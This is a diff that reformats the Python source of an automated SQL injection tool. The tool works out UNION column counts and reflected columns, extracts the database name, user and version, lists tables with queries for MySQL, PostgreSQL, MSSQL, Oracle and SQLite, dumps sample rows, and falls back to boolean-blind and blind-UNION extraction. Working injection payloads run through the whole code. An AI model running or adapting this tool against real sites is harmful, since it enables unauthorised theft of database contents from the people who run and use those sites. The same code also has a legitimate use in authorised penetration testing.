@@ -14,8 +14,9 @@ def _build_url(url: str, param: str, payload: str) -> str:
     return f"{url}{sep}{param}={payload}"
 
 
-def _try(url: str, param: str, payload: str, sess: requests.Session,
-         timeout: float) -> Optional[requests.Response]:
+def _try(
+    url: str, param: str, payload: str, sess: requests.Session, timeout: float
+) -> Optional[requests.Response]:
     try:
         return sess.get(_build_url(url, param, payload), timeout=timeout)
     except Exception as e:
@@ -23,8 +24,7 @@ def _try(url: str, param: str, payload: str, sess: requests.Session,
         return None
 
 
-def _probe_column_count(url: str, param: str, sess: requests.Session,
-                        timeout: float) -> int:
+def _probe_column_count(url: str, param: str, sess: requests.Session, timeout: float) -> int:
     """Column count via UNION SELECT NULL,N...  (quoted + unquoted prefixes).
 
     Returns the smallest n whose NULL-union response is clean (no error),
@@ -38,18 +38,22 @@ def _probe_column_count(url: str, param: str, sess: requests.Session,
             if r is None:
                 continue
             body = r.text.lower()
-            if r.status_code == 200 and "error" not in body \
-                    and "unexpected" not in body \
-                    and "different number of columns" not in body \
-                    and "column count" not in body \
-                    and "doesn't match" not in body \
-                    and r.text != "":
+            if (
+                r.status_code == 200
+                and "error" not in body
+                and "unexpected" not in body
+                and "different number of columns" not in body
+                and "column count" not in body
+                and "doesn't match" not in body
+                and r.text != ""
+            ):
                 return n
     return 0
 
 
-def _find_reflection_points(url: str, param: str, cols: int,
-                            sess: requests.Session, timeout: float) -> List[int]:
+def _find_reflection_points(
+    url: str, param: str, cols: int, sess: requests.Session, timeout: float
+) -> List[int]:
     """Unique-marker probing: which UNION columns are rendered back?"""
     points = []
     for col in range(1, cols + 1):
@@ -70,8 +74,20 @@ def _extract_from_response(text: str) -> List[str]:
     vals = re.findall(r"[A-Za-z0-9_@.\-:]{3,}", text or "")
     seen, out = set(), []
     for v in vals:
-        if v.lower() in ("html", "body", "http", "https", "normal", "response",
-                         "product", "content", "type", "text", "div", "span"):
+        if v.lower() in (
+            "html",
+            "body",
+            "http",
+            "https",
+            "normal",
+            "response",
+            "product",
+            "content",
+            "type",
+            "text",
+            "div",
+            "span",
+        ):
             continue
         if v not in seen:
             seen.add(v)
@@ -79,8 +95,14 @@ def _extract_from_response(text: str) -> List[str]:
     return out[:10]
 
 
-def _extract_via_union(url: str, param: str, cols: int, reflection_points: List[int],
-                       sess: requests.Session, timeout: float) -> list:
+def _extract_via_union(
+    url: str,
+    param: str,
+    cols: int,
+    reflection_points: List[int],
+    sess: requests.Session,
+    timeout: float,
+) -> list:
     """Place DATABASE()/USER()/VERSION() into a reflected column and harvest.
 
     Also enumerates tables (GROUP_CONCAT) when a reflection point exists.
@@ -117,9 +139,29 @@ def _extract_via_union(url: str, param: str, cols: int, reflection_points: List[
 
     # Table enumeration: DBMS-aware query candidates, tried in order.
     dbms = _guess_dbms_from_data(data)
-    noise = ("html", "body", "group", "concat", "table", "name", "information",
-              "schema", "tables", "from", "where", "select", "null", "database",
-              "current", "user", "version", "hostname", "string", "sys", "top")
+    noise = (
+        "html",
+        "body",
+        "group",
+        "concat",
+        "table",
+        "name",
+        "information",
+        "schema",
+        "tables",
+        "from",
+        "where",
+        "select",
+        "null",
+        "database",
+        "current",
+        "user",
+        "version",
+        "hostname",
+        "string",
+        "sys",
+        "top",
+    )
     table_queries = _table_enum_queries(dbms)
     for qexpr in table_queries:
         parts = ["NULL"] * cols
@@ -132,8 +174,7 @@ def _extract_via_union(url: str, param: str, cols: int, reflection_points: List[
         tables = [t for t in tables if t.lower() not in noise]
         tables = list(dict.fromkeys(tables))
         if len(tables) >= 2:
-            data.append({"source": "union_tables", "dbms": dbms,
-                         "values": tables[:15]})
+            data.append({"source": "union_tables", "dbms": dbms, "values": tables[:15]})
             break
     return data
 
@@ -169,12 +210,18 @@ def _table_enum_queries(dbms: str) -> list:
     ]
     by_dbms = {
         "MySQL": generic[:2],
-        "PostgreSQL": ["SELECT STRING_AGG(table_name, ',') FROM "
-                       "information_schema.tables WHERE table_schema=current_schema()"],
-        "MSSQL": ["SELECT STRING_AGG(name, ',') FROM sys.tables",
-                  "SELECT TOP 5 name FROM sys.tables"],
-        "Oracle": ["SELECT LISTAGG(table_name, ',') WITHIN GROUP "
-                   "(ORDER BY table_name) FROM all_tables WHERE owner=USER"],
+        "PostgreSQL": [
+            "SELECT STRING_AGG(table_name, ',') FROM "
+            "information_schema.tables WHERE table_schema=current_schema()"
+        ],
+        "MSSQL": [
+            "SELECT STRING_AGG(name, ',') FROM sys.tables",
+            "SELECT TOP 5 name FROM sys.tables",
+        ],
+        "Oracle": [
+            "SELECT LISTAGG(table_name, ',') WITHIN GROUP "
+            "(ORDER BY table_name) FROM all_tables WHERE owner=USER"
+        ],
         "SQLite": ["SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'"],
     }
     if dbms and dbms in by_dbms:
@@ -198,8 +245,7 @@ def _condition_tester(url: str, param: str, sess: requests.Session, timeout: flo
             break
 
     def _test(condition: str) -> bool:
-        for prefix in ("' AND %s-- ", "' OR %s-- ", "1 AND %s-- ",
-                       '" AND %s-- ', "\" OR %s-- "):
+        for prefix in ("' AND %s-- ", "' OR %s-- ", "1 AND %s-- ", '" AND %s-- ', '" OR %s-- '):
             r = _try(url, param, prefix % condition, sess, timeout)
             if r is None:
                 continue
@@ -228,8 +274,9 @@ def _extract_char(query: str, pos: int, test_fn) -> Optional[str]:
     return None
 
 
-def _extract_via_blind(url: str, param: str, sess: requests.Session,
-                       timeout: float, max_len: int = 24) -> list:
+def _extract_via_blind(
+    url: str, param: str, sess: requests.Session, timeout: float, max_len: int = 24
+) -> list:
     """Boolean-blind extraction of database/user/version (binary search)."""
     test_fn = _condition_tester(url, param, sess, timeout)
     if not test_fn("1=1") or test_fn("1=2"):
@@ -263,13 +310,14 @@ def _union_expr(first_expr: str, cols: int) -> str:
     return "%s, %s" % (first_expr, ", ".join(["NULL"] * (cols - 1)))
 
 
-def _extract_via_blind_union(url: str, param: str, cols: int,
-                             sess: requests.Session, timeout: float,
-                             max_len: int = 16) -> list:
+def _extract_via_blind_union(
+    url: str, param: str, cols: int, sess: requests.Session, timeout: float, max_len: int = 16
+) -> list:
     """Blind UNION extraction: IF(cond,1,2) in col 1, rest NULL.
 
     No reflection needed - the row presence/absence is the oracle.
     """
+
     def _test(condition: str) -> bool:
         payload = "' UNION SELECT %s-- " % _union_expr("IF((%s),1,2)" % condition, cols)
         r = _try(url, param, payload, sess, timeout)
@@ -279,12 +327,12 @@ def _extract_via_blind_union(url: str, param: str, cols: int,
         return r.status_code == 200 and len(r.text) > 30
 
     # Baseline: false condition must be shorter than true condition.
-    base_false = _try(url, param,
-                      "' UNION SELECT %s-- " % _union_expr("IF((1=2),1,2)", cols),
-                      sess, timeout)
-    base_true = _try(url, param,
-                     "' UNION SELECT %s-- " % _union_expr("IF((1=1),1,2)", cols),
-                     sess, timeout)
+    base_false = _try(
+        url, param, "' UNION SELECT %s-- " % _union_expr("IF((1=2),1,2)", cols), sess, timeout
+    )
+    base_true = _try(
+        url, param, "' UNION SELECT %s-- " % _union_expr("IF((1=1),1,2)", cols), sess, timeout
+    )
     if base_false is None or base_true is None:
         return []
     if len(base_true.text) <= len(base_false.text):
@@ -292,9 +340,13 @@ def _extract_via_blind_union(url: str, param: str, cols: int,
     threshold = (len(base_true.text) + len(base_false.text)) // 2
 
     def _test_gt(condition: str) -> bool:
-        r = _try(url, param,
-                 "' UNION SELECT %s-- " % _union_expr("IF((%s),1,2)" % condition, cols),
-                 sess, timeout)
+        r = _try(
+            url,
+            param,
+            "' UNION SELECT %s-- " % _union_expr("IF((%s),1,2)" % condition, cols),
+            sess,
+            timeout,
+        )
         return r is not None and len(r.text) > threshold
 
     data = []
@@ -313,18 +365,41 @@ def _extract_via_blind_union(url: str, param: str, cols: int,
     return data
 
 
-def _extract_table_data(url: str, param: str, cols: int, reflection_points: List[int],
-                           table: str, sess: requests.Session,
-                           timeout: float) -> list:
+def _extract_table_data(
+    url: str,
+    param: str,
+    cols: int,
+    reflection_points: List[int],
+    table: str,
+    sess: requests.Session,
+    timeout: float,
+) -> list:
     """Given a table name, enumerate its columns then dump sample rows
     through the first reflected UNION column (DBMS-agnostic best effort)."""
     if not reflection_points:
         return []
     col = reflection_points[0]
     data = []
-    noise2 = ("html", "body", "table", "name", "information", "schema",
-               "columns", "from", "where", "select", "null", "database",
-               "column", "group", "concat", "listagg", "pragma", "row")
+    noise2 = (
+        "html",
+        "body",
+        "table",
+        "name",
+        "information",
+        "schema",
+        "columns",
+        "from",
+        "where",
+        "select",
+        "null",
+        "database",
+        "column",
+        "group",
+        "concat",
+        "listagg",
+        "pragma",
+        "row",
+    )
     col_queries = [
         "(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS "
         "WHERE TABLE_NAME='%s')" % table,
@@ -354,7 +429,8 @@ def _extract_table_data(url: str, param: str, cols: int, reflection_points: List
     # Row dump: CONCAT_WS('|', col...) then GROUP_CONCAT with newline separator.
     expr = "CONCAT_WS('|',%s)" % ",".join(columns)
     row_queries = [
-        "(SELECT GROUP_CONCAT(%s SEPARATOR 0x0a) FROM (SELECT %s FROM %s LIMIT 5) t)" % (expr, expr, table),
+        "(SELECT GROUP_CONCAT(%s SEPARATOR 0x0a) FROM (SELECT %s FROM %s LIMIT 5) t)"
+        % (expr, expr, table),
         "(SELECT GROUP_CONCAT(%s) FROM %s)" % (expr, table),
     ]
     for qexpr in row_queries:
@@ -380,11 +456,17 @@ def _extract_table_data(url: str, param: str, cols: int, reflection_points: List
     return data
 
 
-def check(url: str, param: str, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0) -> Dict:
+def check(
+    url: str, param: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> Dict:
     sess = sess or make_session()
-    result = {"vulnerable": False, "data": [], "type": None,
-              "column_count": None, "reflection_points": []}
+    result = {
+        "vulnerable": False,
+        "data": [],
+        "type": None,
+        "column_count": None,
+        "reflection_points": [],
+    }
 
     cols = _probe_column_count(url, param, sess, timeout)
     result["column_count"] = cols
@@ -405,8 +487,9 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                         tables = d["values"]
                         break
                 if tables:
-                    result["data"].extend(_extract_table_data(
-                        url, param, cols, points, tables[0], sess, timeout))
+                    result["data"].extend(
+                        _extract_table_data(url, param, cols, points, tables[0], sess, timeout)
+                    )
         else:
             # Column count proven but no reflection: blind union extraction.
             blind_union = _extract_via_blind_union(url, param, cols, sess, timeout)
